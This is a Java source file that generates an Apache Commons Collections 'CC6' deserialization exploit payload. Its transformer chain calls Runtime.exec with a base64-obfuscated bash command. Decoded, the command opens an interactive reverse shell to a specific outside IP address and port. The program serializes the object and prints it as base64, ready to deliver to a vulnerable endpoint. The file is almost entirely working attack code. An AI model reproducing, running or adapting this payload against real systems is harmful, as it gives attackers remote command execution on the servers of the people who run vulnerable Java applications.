package playloads;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.io.*;
import java.lang.reflect.*;
import java.util.Base64;
import java.util.HashMap;
import java.util.Map;

public class CC6{
    public static void main(String[] args) throws Exception {

        System.setProperty("org.apache.commons.collections.enableUnsafeSerialization", "true");
        Transformer[] transformers;
        transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}),
                new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}),
                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMDEuMzQuODAuMTUyLzk5OTkgMD4mMQ==}|{base64,-d}|{bash,-i}"}),

        };
        ChainedTransformer chainedTransformer=new ChainedTransformer(transformers);
        HashMap<Object, Object> map = new HashMap<>();

        Map<Object,Object> lazydMap = LazyMap.decorate(map, new ConstantTransformer(1));
        TiedMapEntry tiedMapEntry=new TiedMapEntry(lazydMap,"a");

        HashMap<Object,Object> map2 = new HashMap<>();
        map2.put(tiedMapEntry,"bbb");
        lazydMap.remove("a");


        Class<LazyMap> c = LazyMap.class;
        Field factoryField = c.getDeclaredField("factory");
        factoryField.setAccessible(true);
        factoryField.set(lazydMap,chainedTransformer);

        serialize(map2);
//        unserialize("ser.bin");
    }

    public static void serialize(Object obj) throws IOException {
        ByteArrayOutputStream data=new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(data);
        oos.writeObject(obj);
        oos.flush();
        oos.close();
        System.out.println(Base64.getEncoder().encodeToString(data.toByteArray()));
    }

    //反序列化方法
    public static void unserialize(String filename) throws IOException, ClassNotFoundException {
        ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream(filename));
        objectInputStream.readObject();
    }
}
